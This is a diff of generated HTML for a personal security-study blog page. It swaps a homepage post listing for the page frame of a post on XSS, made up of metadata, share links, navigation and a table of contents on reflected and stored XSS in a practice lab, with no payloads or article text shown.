+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-02-27T20:55:52+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Feb 27, 2024</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/22/pwn_heap_data_structure/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
+          
   
   
   
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/xss/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>xss</p></a></div>
+  <span hidden itemprop="keywords">xss</span>
+  
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2020/10/26/web_xss/&title=XSS - x1ngg3's blog&summary=网络安全课作业需要，菜鸡被迫了解一下xss。"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2020/10/26/web_xss/&title=XSS - x1ngg3's blog&summary=网络安全课作业需要，菜鸡被迫了解一下xss。"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2020/10/26/web_xss/&title=XSS - x1ngg3's blog&summary=网络安全课作业需要，菜鸡被迫了解一下xss。"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/2020/10/27/pwn_uaf/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>uaf</p>
+          <p class='content'>ヽ(✿ﾟ▽ﾟ)ノ
+
+
+Introduction简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况
+
+内存块被释放后，其对...</p>
+        </a>
+      
+      
+        <a class='next' href='/2020/10/24/algorithm_review/'>
+          <p class='title'>Algorithm_review<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>算法课复习~~
+
+
+写在前面的话要考试了，整理一下之前做过的OJ，希望考试能做出一道题稳个及格。
+文章末尾记录了一下常用函数和其头文件。
+递归&amp;&amp;回溯其实我分不太清递归与回溯。。...</p>
+        </a>
+      
+    </div>
+  
+  <!-- 文章推荐 -->
+  
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+      <meta itemprop="discussionUrl" content="/2020/10/26/web_xss/index.html#comments">
     </span>
-  
-  
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/22/pwn_heap_data_structure/"  itemprop="url">
-        Heap Related Data Structure
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>好难啊</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-22T08:00:00+08:00">2020-10-22</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/22/pwn_heap_data_structure/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
+    <div id="layoutHelper-comments"></div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/20/nothing_memo/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/20/nothing_memo/"  itemprop="url">
-        x1ngg3's memo
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>我的备忘录，仅此而已</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-20T08:00:00+08:00">2020-10-20</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/NOTHING/">NOTHING</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/NOTHING/" itemprop="url"><span itemprop="name">NOTHING</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/20/nothing_memo/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
+  </article>
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/19/pwn_heap_overview/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/19/pwn_heap_overview/"  itemprop="url">
-        Heap Overview
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>heap~</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-19T08:00:00+08:00">2020-10-19</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/19/pwn_heap_overview/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/15/pwn_off-by-one/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/15/pwn_off-by-one/"  itemprop="url">
-        Off-by-one
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>(；′⌒&#96;)</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-15T08:00:00+08:00">2020-10-15</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/15/pwn_off-by-one/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-      <br>
-      <div class="prev-next">
-        
-        <p class="current">
-          1 / 3
-        </p>
-        
-          <a class="next" rel="next" href="/page/2/">
-            <section class="post next white-box shadow floatable blur">
-              &nbsp;Next&nbsp;<i class="fa-solid fa-chevron-right" aria-hidden="true"></i>
-            </section>
-          </a>
-        
-      </div>
-    
-  
 
 
 </div>
@@ -3206,169 +2775,31 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
-<section class="widget blogger desktop mobile ">
-  <div class='content'>
     
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">x1ngg3's blog</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fa-solid fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fa-solid fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget category desktop">
-    
-  <header>
-    
-      <a href='/blog/categories/'><i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/Algorithm/" href="/categories/Algorithm/"
-            active-action="action-categoriesAlgorithm"
-            ><div class='name'>Algorithm</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/CRYPTO/" href="/categories/CRYPTO/"
-            active-action="action-categoriesCRYPTO"
-            ><div class='name'>CRYPTO</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/Contest/" href="/categories/Contest/"
-            active-action="action-categoriesContest"
-            ><div class='name'>Contest</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/LR/" href="/categories/LR/"
-            active-action="action-categoriesLR"
-            ><div class='name'>LR</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/NOTHING/" href="/categories/NOTHING/"
-            active-action="action-categoriesNOTHING"
-            ><div class='name'>NOTHING</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/PWN/" href="/categories/PWN/"
-            active-action="action-categoriesPWN"
-            ><div class='name'>PWN</div><div class='badge'>(9)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/RE/" href="/categories/RE/"
-            active-action="action-categoriesRE"
-            ><div class='name'>RE</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/WEB/" href="/categories/WEB/"
-            active-action="action-categoriesWEB"
-            ><div class='name'>WEB</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/test/" href="/categories/test/"
-            active-action="action-categoriestest"
-            ><div class='name'>test</div><div class='badge'>(1)</div></a></li>
-        
-      </ul>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget tagcloud desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fa-solid fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/Algorithm-review/" style="font-size: 14px; color: #999">Algorithm_review</a> <a href="/tags/CrackMe160/" style="font-size: 14px; color: #999">CrackMe160</a> <a href="/tags/House-Of-Spirit/" style="font-size: 14px; color: #999">House Of Spirit</a> <a href="/tags/SCTF/" style="font-size: 14px; color: #999">SCTF</a> <a href="/tags/WangDingCup-2020/" style="font-size: 14px; color: #999">WangDingCup_2020</a> <a href="/tags/XCTF-RE/" style="font-size: 14px; color: #999">XCTF_RE</a> <a href="/tags/buuoj-re/" style="font-size: 14px; color: #999">buuoj_re</a> <a href="/tags/chunk-extend/" style="font-size: 14px; color: #999">chunk_extend</a> <a href="/tags/crypto-buuoj/" style="font-size: 14px; color: #999">crypto_buuoj</a> <a href="/tags/heap/" style="font-size: 20.67px; color: #6c6c6c">heap</a> <a href="/tags/hook/" style="font-size: 14px; color: #999">hook</a> <a href="/tags/memo/" style="font-size: 14px; color: #999">memo</a> <a href="/tags/off-by-one/" style="font-size: 14px; color: #999">off_by_one</a> <a href="/tags/overlap/" style="font-size: 14px; color: #999">overlap</a> <a href="/tags/pwn/" style="font-size: 24px; color: #555">pwn</a> <a href="/tags/pwn-buuoj/" style="font-size: 14px; color: #999">pwn_buuoj</a> <a href="/tags/pwn-xctf/" style="font-size: 14px; color: #999">pwn_xctf</a> <a href="/tags/stackoverflow/" style="font-size: 14px; color: #999">stackoverflow</a> <a href="/tags/test/" style="font-size: 14px; color: #999">test</a> <a href="/tags/uaf/" style="font-size: 14px; color: #999">uaf</a> <a href="/tags/webweb/" style="font-size: 14px; color: #999">webweb</a> <a href="/tags/xss/" style="font-size: 14px; color: #999">xss</a> <a href="/tags/%E5%9B%BD%E8%B5%9B/" style="font-size: 14px; color: #999">国赛</a> <a href="/tags/%E6%97%A5%E6%9A%AE/" style="font-size: 14px; color: #999">日暮</a> <a href="/tags/%E6%A9%99%E9%9D%92/" style="font-size: 14px; color: #999">橙青</a> <a href="/tags/%E7%94%B5%E5%BD%B1%E6%84%9F/" style="font-size: 14px; color: #999">电影感</a> <a href="/tags/%E8%B0%83%E8%89%B2/" style="font-size: 17.33px; color: #828282">调色</a>
-    </div>
-  </section>
-
-
-    
-  
-
   
 
 
 <div class="widget-sticky">
+
+  
+  
+
+
+<section class="widget toc-wrapper desktop mobile" id="toc-div" >
+  
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#phpstudy"><span class="toc-text">phpstudy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pikachu-master"><span class="toc-text">pikachu-master</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE"><span class="toc-text">文件配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8"><span class="toc-text">启动</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8E%E6%94%BB%E5%87%BB%E8%80%85"><span class="toc-text">服务器与攻击者</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%A6%82%E8%BF%B0"><span class="toc-text">XSS概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-text">反射型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#get%E5%9E%8BXSS"><span class="toc-text">get型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#post%E5%9E%8Bxss"><span class="toc-text">post型xss</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2"><span class="toc-text">参考博客</span></a></li></ol>
+  </div>
+</section>
+
+  
 
 </div>
 
@@ -3858,7 +3289,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"x1ngg3's blog"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"x1ngg3's blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"x1ngg3's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"x1ngg3's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/WEB/","name":"WEB"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2020/10/26/web_xss/","name":"XSS"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"x1ngg3's blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"XSS","description":"网络安全课作业需要，菜鸡被迫了解一下xss。","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2020/10/26/web_xss/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"x1ngg3's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2020/10/26/web_xss/","wordCount":22,"datePublished":"2020-10-26T00:00:00.000Z","dateModified":"2024-02-27T12:55:52.628Z","articleSection":"WEB","keywords":"xss","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
